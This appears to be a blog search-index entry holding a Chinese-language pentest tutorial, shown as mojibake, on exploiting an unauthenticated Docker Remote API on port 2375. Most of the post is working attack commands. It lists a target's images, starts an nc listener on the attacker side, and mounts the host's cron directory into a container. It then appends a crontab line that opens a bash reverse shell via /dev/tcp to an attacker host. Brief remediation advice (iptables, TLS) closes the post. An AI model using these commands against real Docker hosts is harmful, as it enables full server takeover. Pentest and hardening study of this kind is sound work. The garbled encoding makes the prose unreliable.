    <title>Docker Remote API æœªæˆæƒè®¿é—®æ¼æ´åˆ©ç”¨</title>
    <link href="/2020/05/23/Docker-Remote-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <url>/2020/05/23/Docker-Remote-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h4 id="æ¼æ´ç®€ä»‹åŠå±å®³"><a href="#æ¼æ´ç®€ä»‹åŠå±å®³" class="headerlink" title="æ¼æ´ç®€ä»‹åŠå±å®³"></a>æ¼æ´ç®€ä»‹åŠå±å®³</h4><p>Dockeræ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼Œè®©å¼€å‘è€…å¯ä»¥æ‰“åŒ…ä»–ä»¬çš„åº”ç”¨ä»¥åŠä¾èµ–åŒ…åˆ°ä¸€ä¸ªå¯ç§»æ¤çš„å®¹å™¨ä¸­ï¼Œç„¶åå‘å¸ƒåˆ°ä»»ä½•æµè¡Œçš„LINUXæœºå™¨ä¸Šï¼Œä¹Ÿå¯ä»¥å®ç°è™šæ‹ŸåŒ–ã€‚ Docker swarm æ˜¯ä¸€ä¸ªå°†dockeré›†ç¾¤å˜æˆå•ä¸€è™šæ‹Ÿçš„docker hostå·¥å…·ï¼Œä½¿ç”¨æ ‡å‡†çš„Docker APIï¼Œèƒ½å¤Ÿæ–¹ä¾¿dockeré›†ç¾¤çš„ç®¡ç†å’Œæ‰©å±•ï¼Œç”±dockerå®˜æ–¹æä¾›ã€‚</p><p>Docker Remote API æ˜¯ä¸€ä¸ªå–ä»£è¿œç¨‹å‘½ä»¤è¡Œç•Œé¢ï¼ˆrcliï¼‰çš„REST APIã€‚Docker Remote APIå¦‚é…ç½®ä¸å½“å¯å¯¼è‡´æœªæˆæƒè®¿é—®ï¼Œæ”»å‡»è€…åˆ©ç”¨ docker client æˆ–è€… http ç›´æ¥è¯·æ±‚å°±å¯ä»¥è®¿é—®è¿™ä¸ª APIï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œé»‘å®¢ä¹Ÿå¯ä»¥åˆ é™¤Dockerä¸Šçš„æ•°æ®ã€‚ æ”»å‡»è€…å¯è¿›ä¸€æ­¥åˆ©ç”¨Dockerè‡ªèº«ç‰¹æ€§ï¼Œç›´æ¥è®¿é—®å®¿ä¸»æœºä¸Šçš„æ•æ„Ÿä¿¡æ¯ï¼Œæˆ–å¯¹æ•æ„Ÿæ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼Œæœ€ç»ˆå®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚</p><h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><h5 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h5><pre><code class="hljs plain"># é¶æœºIP&#x2F;ç«¯å£172.19.101.34 2375# æ“ä½œç³»ç»Ÿlinux_x86</code></pre><h5 id="æœªæˆæƒè®¿é—®æµ‹è¯•"><a href="#æœªæˆæƒè®¿é—®æµ‹è¯•" class="headerlink" title="æœªæˆæƒè®¿é—®æµ‹è¯•"></a>æœªæˆæƒè®¿é—®æµ‹è¯•</h5><pre><code class="hljs plain">docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 images# è¿”å›é•œåƒä¿¡æ¯ï¼Œæ¼æ´å­˜åœ¨</code></pre><h5 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h5><pre><code class="hljs plain"># åœ¨æ”»å‡»ä¸»æœºä¸Šæ‰“å¼€8088ç«¯å£ç›‘å¬[root@]# nc -vv -l -p 8088</code></pre><h5 id="å†™å…¥shell"><a href="#å†™å…¥shell" class="headerlink" title="å†™å…¥shell"></a>å†™å…¥shell</h5><p>åˆ›å»ºå®¹å™¨ï¼Œåˆ©ç”¨bashå’Œcrontabè®¡åˆ’ä»»åŠ¡å‘å®¿ä¸»æœºå†™å…¥shellï¼Œcentosç³»ç»ŸæŒ‚è½½è·¯å¾„ä¸ºã€‚ /var/spool/cron/rootï¼›ubuntuç³»ç»Ÿä¸º/var/spool/cron/crontabs/rootï¼›</p><pre><code class="hljs plain"># æŸ¥çœ‹å®¿ä¸»æœºå¯ç”¨é•œåƒdocker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 images# é€‰æ‹©åˆé€‚é•œåƒåˆ›å»ºå®¹å™¨docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 run -it -v &#x2F;var&#x2F;spool&#x2F;cron&#x2F;:&#x2F;var&#x2F;spool&#x2F;cron&#x2F; image_id &#x2F;bin&#x2F;bash# å¯åŠ¨åˆšåˆšåˆ›å»ºçš„å®¹å™¨å¹¶è¿æ¥docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 start ct_iddocker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 exec -it --user root ct_id &#x2F;bin&#x2F;bash# æ‰§è¡Œshellåå¼¹å‘½ä»¤root@bfd2539dfdc8:&#x2F;# echo &#39;* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;8088 0&gt;&amp;1&#39; &gt;&gt; &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</code></pre><h5 id="æˆåŠŸåå¼¹å®¿ä¸»æœºshell"><a href="#æˆåŠŸåå¼¹å®¿ä¸»æœºshell" class="headerlink" title="æˆåŠŸåå¼¹å®¿ä¸»æœºshell"></a>æˆåŠŸåå¼¹å®¿ä¸»æœºshell</h5><p><img src="/img/docker_res.png" srcset="/img/loading.gif" alt="image"></p><blockquote><p>P.S ï¼Œæµ‹è¯•å®Œè®°å¾—åˆ æ‰å­˜åœ¨æ¼æ´çš„å®¹å™¨</p></blockquote><h4 id="ä¿®å¤å»ºè®®"><a href="#ä¿®å¤å»ºè®®" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h4><p>ä¸´æ—¶è§£å†³æ–¹æ¡ˆï¼š</p><p>1ã€å¯¹2375ç«¯å£åšç½‘ç»œè®¿é—®æ§åˆ¶ï¼Œå¦‚è®¾ç½®iptablesç­–ç•¥ä»…å…è®¸æŒ‡å®šçš„IPæ¥è®¿é—®Dockeræ¥å£ï¼›</p><p>2ã€ä¿®æ”¹docker swarmçš„è®¤è¯æ–¹å¼ï¼Œä½¿ç”¨TLSè®¤è¯ï¼šOverview Swarm with TLS å’Œ Configure Docker Swarm for TLSè¿™ä¸¤ç¯‡æ–‡æ¡£ï¼Œè¯´çš„æ˜¯é…ç½®å¥½TLSåï¼ŒDocker CLI åœ¨å‘é€å‘½ä»¤åˆ°docker daemonä¹‹å‰ï¼Œä¼šé¦–å…ˆå‘é€å®ƒçš„è¯ä¹¦ï¼Œå¦‚æœè¯ä¹¦æ˜¯ç”±daemonä¿¡ä»»çš„CAæ‰€ç­¾åçš„ï¼Œæ‰å¯ä»¥ç»§ç»­æ‰§è¡Œã€‚</p><p><strong>æ€»ä¹‹ã€ä¸è¦å°†ç«¯å£ç›´æ¥æš´éœ²åœ¨å…¬ç½‘ï¼Œå†…ç½‘ä¸­ä½¿ç”¨éœ€è¦è®¾ç½®ä¸¥æ ¼çš„è®¿é—®è§„åˆ™ï¼Œå¹¶ä½¿ç”¨TLSã€‚</strong></p><p><a href="https://zhuanlan.zhihu.com/p/142798377" target="_blank" rel="noopener">ğŸ”—çŸ¥ä¹é“¾æ¥</a></p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€æµ‹è¯•</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
